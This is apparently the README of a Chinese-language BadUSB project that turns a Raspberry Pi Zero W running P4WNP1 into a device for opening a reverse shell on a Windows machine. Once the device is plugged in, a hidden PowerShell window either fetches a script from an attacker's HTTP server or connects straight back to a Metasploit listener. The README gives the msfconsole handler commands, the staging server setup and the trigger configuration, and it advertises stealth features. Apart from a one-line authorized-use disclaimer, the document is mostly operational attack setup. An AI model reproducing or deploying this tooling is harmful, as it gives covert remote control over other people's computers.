# P4WNP1 BadUSB Reverse Shell Project

基于 P4WNP1 ALOA 的 BadUSB 反向 Shell 工具，插入USB即可获取目标机器的远程控制。

## 项目结构

```
p4wnp1-badusb/
├── README.md                    # 项目说明
├── hid_scripts/
│   ├── staged_shell.js          # 分阶段版 (推荐)
│   └── direct_shell.js          # 直连版
├── payloads/
│   └── rev.ps1                  # PowerShell 反弹 shell
├── deploy/
│   └── deploy.py                # 自动部署脚本
└── docs/
    └── setup_guide.md           # 部署指南
```

## 功能特点

- 插入 USB 自动执行
- 无需文件落地到目标磁盘
- 支持分阶段/直连两种模式
- 隐藏 PowerShell 窗口执行

## 环境要求

| 设备 | 系统 | 用途 |
|------|------|------|
| 树莓派 Zero W | P4WNP1 ALOA | BadUSB 设备 |
| 攻击机 | Kali Linux | MSF 监听 |
| 目标机 | Windows 10/11/Server | 被控端 |

## 快速开始

### 1. 部署到树莓派

```bash
python3 deploy/deploy.py --pi-ip 172.16.0.1 --attacker-ip <攻击机IP>
```

### 2. Kali 攻击机设置

```bash
# 启动 MSF 监听
msfconsole -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <攻击机IP>; set LPORT 4444; exploit"

# 启动 HTTP 服务器 (分阶段模式)
cd /var/www/html && python3 -m http.server 80
```

### 3. 配置 P4WNP1 触发器

1. 访问 `http://172.16.0.1:8000`
2. TriggerActions → 添加
3. Event: `TRIGGER_USB_GADGET_CONNECTED`
4. Action: HIDScript → `staged_shell`

### 4. 插入 USB

插入树莓派到目标机器，自动获取 shell。

## 两种模式对比

| 模式 | 文件 | 优点 | 缺点 |
|------|------|------|------|
| 分阶段 | staged_shell.js | 更隐蔽 | 需要HTTP服务器 |
| 直连 | direct_shell.js | 简单 | 命令较长 |

## 工作流程

### 分阶段模式
```
USB插入 → Win+R → PowerShell下载脚本 → 连接MSF → 获取shell
```

### 直连模式
```
USB插入 → Win+R → 直接输入反弹shell命令 → 连接MSF → 获取shell
```

## 配置说明

修改 `hid_scripts/staged_shell.js` 中的配置：

```javascript
// ===== CONFIG =====
var LISTENER_IP = "172.16.0.2";  // Kali 攻击机 IP
var HTTP_PORT = "80";                  // HTTP 服务器端口
// ==================
```

## MSF 监听配置

```bash
# 推荐使用 shell 类型 (兼容性好)
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <攻击机IP>
set LPORT 4444
exploit

# 或使用 Meterpreter (需要特殊处理)
set payload windows/x64/meterpreter/reverse_tcp
```

## 常见问题

**Q: Session立刻关闭？**
- 改用 `shell_reverse_tcp` 而不是 `meterpreter/reverse_tcp`
- 检查防火墙是否放行

**Q: USB没有反应？**
- 确认 P4WNP1 触发器配置正确
- 检查 HIDScripts 目录权限

**Q: 404错误？**
- 确保 Kali HTTP 服务器已启动
- 确保 rev.ps1 在 `/var/www/html/` 目录

## 免责声明

本项目仅供授权安全测试使用，使用者需遵守当地法律法规。

## License

MIT
